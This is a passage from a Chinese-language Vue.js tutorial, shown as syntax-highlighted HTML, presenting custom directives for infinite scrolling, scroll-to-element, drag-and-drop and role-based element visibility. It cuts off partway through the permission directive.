        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(options, newValue)
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newValue === <span class="hljs-string">'function'</span>) {
        <span class="hljs-comment">// 如果传入了新函数，需要更新回调</span>
        <span class="hljs-comment">// 注意：这里需要重新绑定事件，简化处理</span>
      }
      
      <span class="hljs-comment">// 强制检查一次</span>
      <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">force</span>) {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-keyword">const</span> event = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">'scroll'</span>)
          el.<span class="hljs-title function_">dispatchEvent</span>(event)
        })
      }
    },
    
    <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-comment">// 清理事件监听</span>
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_infiniteScrollHandler</span>) {
        el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'scroll'</span>, el.<span class="hljs-property">_infiniteScrollHandler</span>)
        <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_infiniteScrollHandler</span>
      }
      
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_resizeHandler</span>) {
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, el.<span class="hljs-property">_resizeHandler</span>)
        <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_resizeHandler</span>
      }
      
      <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_infiniteScrollOptions</span>
    }
  },
  
  <span class="hljs-comment">// 滚动到元素指令</span>
  <span class="hljs-attr">scrollTo</span>: {
    <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> { value, modifiers, arg } = binding
      
      el.<span class="hljs-property">_scrollToHandler</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
        event.<span class="hljs-title function_">preventDefault</span>()
        
        <span class="hljs-keyword">const</span> targetSelector = <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'string'</span> ? value : value?.<span class="hljs-property">target</span>
        <span class="hljs-keyword">const</span> options = <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span> ? value : {}
        
        <span class="hljs-keyword">const</span> targetElement = targetSelector 
          ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(targetSelector)
          : <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>
        
        <span class="hljs-keyword">if</span> (!targetElement) <span class="hljs-keyword">return</span>
        
        <span class="hljs-comment">// 滚动配置</span>
        <span class="hljs-keyword">const</span> scrollOptions = {
          <span class="hljs-attr">behavior</span>: modifiers.<span class="hljs-property">smooth</span> ? <span class="hljs-string">'smooth'</span> : <span class="hljs-string">'auto'</span>,
          <span class="hljs-attr">block</span>: arg || <span class="hljs-string">'start'</span>,  <span class="hljs-comment">// start, center, end, nearest</span>
          <span class="hljs-attr">inline</span>: <span class="hljs-string">'nearest'</span>
        }
        
        <span class="hljs-comment">// 合并选项</span>
        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(scrollOptions, options)
        
        <span class="hljs-comment">// 执行滚动</span>
        targetElement.<span class="hljs-title function_">scrollIntoView</span>(scrollOptions)
        
        <span class="hljs-comment">// 触发回调</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span> &amp;&amp; value.<span class="hljs-property">onScroll</span>) {
          value.<span class="hljs-title function_">onScroll</span>(targetElement)
        }
      }
      
      <span class="hljs-comment">// 添加点击事件</span>
      el.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_scrollToHandler</span>)
      
      <span class="hljs-comment">// 自动滚动（如果配置了）</span>
      <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">auto</span>) {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          el.<span class="hljs-title function_">_scrollToHandler</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">'click'</span>))
        }, value?.<span class="hljs-property">delay</span> || <span class="hljs-number">0</span>)
      }
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-comment">// 如果值变化且配置了auto，重新触发</span>
      <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">value</span> !== binding.<span class="hljs-property">oldValue</span> &amp;&amp; binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">auto</span>) {
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_scrollToHandler</span>) {
            el.<span class="hljs-title function_">_scrollToHandler</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">'click'</span>))
          }
        }, binding.<span class="hljs-property">value</span>?.<span class="hljs-property">delay</span> || <span class="hljs-number">0</span>)
      }
    },
    
    <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_scrollToHandler</span>) {
        el.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, el.<span class="hljs-property">_scrollToHandler</span>)
        <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_scrollToHandler</span>
      }
    }
  }
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-comment">// &lt;div v-infinite-scroll="loadMore"&gt;内容...&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-infinite-scroll.distance="100"&gt;自定义距离&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-infinite-scroll="{ handler: loadMore, distance: 100, disabled: isLoading }"&gt;</span>
<span class="hljs-comment">// &lt;button v-scroll-to="'#section'"&gt;滚动到章节&lt;/button&gt;</span>
<span class="hljs-comment">// &lt;button v-scroll-to.smooth.auto="{ target: '#section', delay: 500 }"&gt;自动滚动&lt;/button&gt;</span>
</code></pre>
<h4 data-id="heading-11">3.4 拖放指令</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 拖放指令</span>
<span class="hljs-keyword">const</span> vDrag = {
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> { value, modifiers } = binding
    
    <span class="hljs-comment">// 默认配置</span>
    <span class="hljs-keyword">const</span> config = {
      <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>,           <span class="hljs-comment">// 拖拽数据</span>
      <span class="hljs-attr">effect</span>: <span class="hljs-string">'move'</span>,       <span class="hljs-comment">// 拖拽效果</span>
      <span class="hljs-attr">disabled</span>: <span class="hljs-literal">false</span>,      <span class="hljs-comment">// 是否禁用</span>
      <span class="hljs-attr">handle</span>: <span class="hljs-literal">null</span>,         <span class="hljs-comment">// 拖拽手柄选择器</span>
      <span class="hljs-attr">ghost</span>: <span class="hljs-literal">true</span>,          <span class="hljs-comment">// 显示幽灵图像</span>
      <span class="hljs-attr">clone</span>: <span class="hljs-literal">false</span>,         <span class="hljs-comment">// 克隆元素</span>
      <span class="hljs-attr">axis</span>: <span class="hljs-string">'both'</span>,         <span class="hljs-comment">// 拖拽轴向：both, x, y</span>
      <span class="hljs-attr">boundary</span>: <span class="hljs-literal">null</span>,       <span class="hljs-comment">// 边界限制</span>
      <span class="hljs-attr">onStart</span>: <span class="hljs-literal">null</span>,        <span class="hljs-comment">// 开始回调</span>
      <span class="hljs-attr">onMove</span>: <span class="hljs-literal">null</span>,         <span class="hljs-comment">// 移动回调</span>
      <span class="hljs-attr">onEnd</span>: <span class="hljs-literal">null</span>           <span class="hljs-comment">// 结束回调</span>
    }
    
    <span class="hljs-comment">// 合并配置</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span>) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(config, value)
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value !== <span class="hljs-literal">undefined</span>) {
      config.<span class="hljs-property">data</span> = value
    }
    
    <span class="hljs-comment">// 处理修饰符</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">copy</span>) config.<span class="hljs-property">effect</span> = <span class="hljs-string">'copy'</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">link</span>) config.<span class="hljs-property">effect</span> = <span class="hljs-string">'link'</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">x</span>) config.<span class="hljs-property">axis</span> = <span class="hljs-string">'x'</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">y</span>) config.<span class="hljs-property">axis</span> = <span class="hljs-string">'y'</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">noGhost</span>) config.<span class="hljs-property">ghost</span> = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">clone</span>) config.<span class="hljs-property">clone</span> = <span class="hljs-literal">true</span>
    
    <span class="hljs-comment">// 存储配置和状态</span>
    el.<span class="hljs-property">_dragConfig</span> = config
    el.<span class="hljs-property">_dragState</span> = {
      <span class="hljs-attr">isDragging</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">startX</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">startY</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">offsetX</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">offsetY</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">clone</span>: <span class="hljs-literal">null</span>
    }
    
    <span class="hljs-comment">// 设置元素属性</span>
    el.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'draggable'</span>, !config.<span class="hljs-property">disabled</span>)
    
    <span class="hljs-comment">// 找到拖拽手柄</span>
    <span class="hljs-keyword">const</span> dragHandle = config.<span class="hljs-property">handle</span> 
      ? el.<span class="hljs-title function_">querySelector</span>(config.<span class="hljs-property">handle</span>) 
      : el
    
    <span class="hljs-comment">// 事件处理函数</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">onDragStart</span> = (<span class="hljs-params">e</span>) =&gt; {
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">disabled</span>) {
        e.<span class="hljs-title function_">preventDefault</span>()
        <span class="hljs-keyword">return</span>
      }
      
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">isDragging</span> = <span class="hljs-literal">true</span>
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">startX</span> = e.<span class="hljs-property">clientX</span>
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">startY</span> = e.<span class="hljs-property">clientY</span>
      
      <span class="hljs-comment">// 设置拖拽数据</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">data</span> !== <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">const</span> dataString = <span class="hljs-keyword">typeof</span> config.<span class="hljs-property">data</span> === <span class="hljs-string">'string'</span> 
          ? config.<span class="hljs-property">data</span> 
          : <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(config.<span class="hljs-property">data</span>)
        
        e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-title function_">setData</span>(<span class="hljs-string">'application/json'</span>, dataString)
        e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-title function_">setData</span>(<span class="hljs-string">'text/plain'</span>, dataString)
      }
      
      <span class="hljs-comment">// 设置拖拽效果</span>
      e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-property">effectAllowed</span> = config.<span class="hljs-property">effect</span>
      
      <span class="hljs-comment">// 创建幽灵图像</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">ghost</span>) {
        <span class="hljs-keyword">const</span> ghost = el.<span class="hljs-title function_">cloneNode</span>(<span class="hljs-literal">true</span>)
        ghost.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">'0.5'</span>
        ghost.<span class="hljs-property">style</span>.<span class="hljs-property">position</span> = <span class="hljs-string">'absolute'</span>
        ghost.<span class="hljs-property">style</span>.<span class="hljs-property">top</span> = <span class="hljs-string">'-1000px'</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(ghost)
        e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-title function_">setDragImage</span>(ghost, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
        
        <span class="hljs-comment">// 稍后移除</span>
        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">contains</span>(ghost)) {
            <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(ghost)
          }
        }, <span class="hljs-number">0</span>)
      }
      
      <span class="hljs-comment">// 克隆元素（如果需要）</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">clone</span>) {
        <span class="hljs-keyword">const</span> clone = el.<span class="hljs-title function_">cloneNode</span>(<span class="hljs-literal">true</span>)
        clone.<span class="hljs-property">style</span>.<span class="hljs-property">position</span> = <span class="hljs-string">'absolute'</span>
        clone.<span class="hljs-property">style</span>.<span class="hljs-property">zIndex</span> = <span class="hljs-string">'1000'</span>
        clone.<span class="hljs-property">style</span>.<span class="hljs-property">pointerEvents</span> = <span class="hljs-string">'none'</span>
        clone.<span class="hljs-property">style</span>.<span class="hljs-property">opacity</span> = <span class="hljs-string">'0.7'</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(clone)
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span> = clone
      }
      
      <span class="hljs-comment">// 触发开始回调</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> config.<span class="hljs-property">onStart</span> === <span class="hljs-string">'function'</span>) {
        config.<span class="hljs-title function_">onStart</span>(e, el, config.<span class="hljs-property">data</span>)
      }
      
      <span class="hljs-comment">// 添加拖拽样式</span>
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'dragging'</span>)
    }
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">onDrag</span> = (<span class="hljs-params">e</span>) =&gt; {
      <span class="hljs-keyword">if</span> (!el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">isDragging</span>) <span class="hljs-keyword">return</span>
      
      <span class="hljs-comment">// 计算偏移</span>
      <span class="hljs-keyword">const</span> deltaX = e.<span class="hljs-property">clientX</span> - el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">startX</span>
      <span class="hljs-keyword">const</span> deltaY = e.<span class="hljs-property">clientY</span> - el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">startY</span>
      
      <span class="hljs-comment">// 轴向限制</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">axis</span> === <span class="hljs-string">'x'</span>) {
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span> = deltaX
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span> = <span class="hljs-number">0</span>
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (config.<span class="hljs-property">axis</span> === <span class="hljs-string">'y'</span>) {
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span> = <span class="hljs-number">0</span>
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span> = deltaY
      } <span class="hljs-keyword">else</span> {
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span> = deltaX
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span> = deltaY
      }
      
      <span class="hljs-comment">// 边界限制</span>
      <span class="hljs-keyword">if</span> (config.<span class="hljs-property">boundary</span>) {
        <span class="hljs-keyword">const</span> boundary = <span class="hljs-keyword">typeof</span> config.<span class="hljs-property">boundary</span> === <span class="hljs-string">'string'</span>
          ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(config.<span class="hljs-property">boundary</span>)
          : config.<span class="hljs-property">boundary</span>
        
        <span class="hljs-keyword">if</span> (boundary) {
          <span class="hljs-keyword">const</span> boundRect = boundary.<span class="hljs-title function_">getBoundingClientRect</span>()
          <span class="hljs-keyword">const</span> elRect = el.<span class="hljs-title function_">getBoundingClientRect</span>()
          
          <span class="hljs-comment">// 限制在边界内</span>
          el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(
            boundRect.<span class="hljs-property">left</span> - elRect.<span class="hljs-property">left</span>,
            <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span>, boundRect.<span class="hljs-property">right</span> - elRect.<span class="hljs-property">right</span>)
          )
          
          el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(
            boundRect.<span class="hljs-property">top</span> - elRect.<span class="hljs-property">top</span>,
            <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span>, boundRect.<span class="hljs-property">bottom</span> - elRect.<span class="hljs-property">bottom</span>)
          )
        }
      }
      
      <span class="hljs-comment">// 更新克隆元素位置</span>
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>) {
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = 
          <span class="hljs-string">`translate(<span class="hljs-subst">${el._dragState.offsetX}</span>px, <span class="hljs-subst">${el._dragState.offsetY}</span>px)`</span>
      }
      
      <span class="hljs-comment">// 触发移动回调</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> config.<span class="hljs-property">onMove</span> === <span class="hljs-string">'function'</span>) {
        config.<span class="hljs-title function_">onMove</span>(e, el, {
          <span class="hljs-attr">offsetX</span>: el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span>,
          <span class="hljs-attr">offsetY</span>: el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span>,
          deltaX,
          deltaY
        })
      }
    }
    
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">onDragEnd</span> = (<span class="hljs-params">e</span>) =&gt; {
      <span class="hljs-keyword">if</span> (!el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">isDragging</span>) <span class="hljs-keyword">return</span>
      
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">isDragging</span> = <span class="hljs-literal">false</span>
      
      <span class="hljs-comment">// 移除克隆元素</span>
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>) {
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>)
        el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span> = <span class="hljs-literal">null</span>
      }
      
      <span class="hljs-comment">// 触发结束回调</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> config.<span class="hljs-property">onEnd</span> === <span class="hljs-string">'function'</span>) {
        config.<span class="hljs-title function_">onEnd</span>(e, el, {
          <span class="hljs-attr">offsetX</span>: el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span>,
          <span class="hljs-attr">offsetY</span>: el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span>,
          <span class="hljs-attr">success</span>: e.<span class="hljs-property">dataTransfer</span>.<span class="hljs-property">dropEffect</span> !== <span class="hljs-string">'none'</span>
        })
      }
      
      <span class="hljs-comment">// 重置状态</span>
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetX</span> = <span class="hljs-number">0</span>
      el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">offsetY</span> = <span class="hljs-number">0</span>
      
      <span class="hljs-comment">// 移除拖拽样式</span>
      el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'dragging'</span>)
    }
    
    <span class="hljs-comment">// 绑定事件</span>
    dragHandle.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'dragstart'</span>, onDragStart)
    dragHandle.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'drag'</span>, onDrag)
    dragHandle.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'dragend'</span>, onDragEnd)
    
    <span class="hljs-comment">// 存储事件处理函数以便清理</span>
    el.<span class="hljs-property">_dragHandlers</span> = { onDragStart, onDrag, onDragEnd }
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-keyword">const</span> config = el.<span class="hljs-property">_dragConfig</span>
    <span class="hljs-keyword">const</span> newValue = binding.<span class="hljs-property">value</span>
    
    <span class="hljs-comment">// 更新配置</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newValue === <span class="hljs-string">'object'</span>) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(config, newValue)
    }
    
    <span class="hljs-comment">// 更新 draggable 属性</span>
    el.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'draggable'</span>, !config.<span class="hljs-property">disabled</span>)
    
    <span class="hljs-comment">// 如果禁用状态变化</span>
    <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">oldValue</span>?.<span class="hljs-property">disabled</span> !== config.<span class="hljs-property">disabled</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'拖拽指令禁用状态变化:'</span>, config.<span class="hljs-property">disabled</span>)
    }
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-keyword">const</span> dragHandle = el.<span class="hljs-property">_dragConfig</span>?.<span class="hljs-property">handle</span> 
      ? el.<span class="hljs-title function_">querySelector</span>(el.<span class="hljs-property">_dragConfig</span>.<span class="hljs-property">handle</span>) 
      : el
    
    <span class="hljs-keyword">const</span> handlers = el.<span class="hljs-property">_dragHandlers</span>
    
    <span class="hljs-keyword">if</span> (dragHandle &amp;&amp; handlers) {
      dragHandle.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'dragstart'</span>, handlers.<span class="hljs-property">onDragStart</span>)
      dragHandle.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'drag'</span>, handlers.<span class="hljs-property">onDrag</span>)
      dragHandle.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'dragend'</span>, handlers.<span class="hljs-property">onDragEnd</span>)
    }
    
    <span class="hljs-comment">// 清理克隆元素</span>
    <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_dragState</span>?.<span class="hljs-property">clone</span> &amp;&amp; <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">contains</span>(el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>)) {
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(el.<span class="hljs-property">_dragState</span>.<span class="hljs-property">clone</span>)
    }
    
    <span class="hljs-comment">// 清理引用</span>
    <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_dragConfig</span>
    <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_dragState</span>
    <span class="hljs-keyword">delete</span> el.<span class="hljs-property">_dragHandlers</span>
  }
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-comment">// &lt;div v-drag="dragData"&gt;可拖拽&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-drag.copy&gt;复制模式&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-drag.x&gt;仅水平拖拽&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-drag="{ data: item, disabled: !isEditable, onEnd: handleDrop }"&gt;</span>
<span class="hljs-comment">// &lt;div v-drag.clone&gt;拖拽时显示克隆&lt;/div&gt;</span>
<span class="hljs-comment">// &lt;div v-drag.no-ghost&gt;不显示幽灵图像&lt;/div&gt;</span>
</code></pre>
<h4 data-id="heading-12">3.5 权限控制指令</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 权限控制指令集</span>
<span class="hljs-keyword">const</span> permissionDirectives = {
  <span class="hljs-comment">// 角色权限指令</span>
  <span class="hljs-attr">role</span>: {
    <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> { value, modifiers, arg } = binding
      
      <span class="hljs-comment">// 获取当前用户角色</span>
      <span class="hljs-keyword">const</span> userRole = <span class="hljs-title function_">getCurrentUserRole</span>()
      
      <span class="hljs-comment">// 检查权限</span>
      <span class="hljs-keyword">const</span> hasPermission = <span class="hljs-title function_">checkRolePermission</span>(userRole, value, arg)
      
      <span class="hljs-comment">// 根据权限显示/隐藏元素</span>
      <span class="hljs-keyword">if</span> (!hasPermission) {
        <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">hide</span>) {
          <span class="hljs-comment">// 隐藏元素</span>
          el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>
          el.<span class="hljs-property">_originalDisplay</span> = el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">disable</span>) {
          <span class="hljs-comment">// 禁用元素</span>
          el.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>
          el.<span class="hljs-property">_originalDisabled</span> = el.<span class="hljs-property">disabled</span>
          el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'disabled'</span>)
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (modifiers.<span class="hljs-property">remove</span>) {
          <span class="hljs-comment">// 移除元素</span>
          el.<span class="hljs-property">parentNode</span>?.<span class="hljs-title function_">removeChild</span>(el)
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-comment">// 默认：隐藏元素</span>
          el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>
          el.<span class="hljs-property">_originalDisplay</span> = el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span>
        }
      }
      
      <span class="hljs-comment">// 存储权限信息</span>
      el.<span class="hljs-property">_permissionInfo</span> = {
        <span class="hljs-attr">required</span>: value,
        userRole,
        hasPermission,
        <span class="hljs-attr">action</span>: arg || <span class="hljs-string">'view'</span>
      }
    },
    
    <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
      <span class="hljs-keyword">const</span> oldPermission = el.<span class="hljs-property">_permissionInfo</span>
      <span class="hljs-keyword">const</span> newValue = binding.<span class="hljs-property">value</span>
      
      <span class="hljs-comment">// 重新检查权限</span>
      <span class="hljs-keyword">const</span> userRole = <span class="hljs-title function_">getCurrentUserRole</span>()
      <span class="hljs-keyword">const</span> hasPermission = <span class="hljs-title function_">checkRolePermission</span>(userRole, newValue, binding.<span class="hljs-property">arg</span>)
      
      <span class="hljs-comment">// 如果权限状态变化</span>
      <span class="hljs-keyword">if</span> (oldPermission.<span class="hljs-property">hasPermission</span> !== hasPermission) {
        <span class="hljs-comment">// 恢复原始状态</span>
        <span class="hljs-keyword">if</span> (oldPermission.<span class="hljs-property">hasPermission</span> === <span class="hljs-literal">false</span>) {
          <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">hide</span> &amp;&amp; el.<span class="hljs-property">_originalDisplay</span> !== <span class="hljs-literal">undefined</span>) {
            el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = el.<span class="hljs-property">_originalDisplay</span>
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">disable</span> &amp;&amp; el.<span class="hljs-property">_originalDisabled</span> !== <span class="hljs-literal">undefined</span>) {
            el.<span class="hljs-property">disabled</span> = el.<span class="hljs-property">_originalDisabled</span>
            el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'disabled'</span>)
          }
        }
        
        <span class="hljs-comment">// 应用新权限</span>
        <span class="hljs-keyword">if</span> (!hasPermission) {
          <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">hide</span>) {
            el.<span class="hljs-property">_originalDisplay</span> = el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span>
            el.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (binding.<span class="hljs-property">modifiers</span>.<span class="hljs-property">disable</span>) {
            el.<span class="hljs-property">_originalDisabled</span> = el.<span class="hljs-property">disabled</span>
            el.<span class="hljs-property">disabled</span> = <span class="hljs-literal">true</span>
            el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'disabled'</span>)
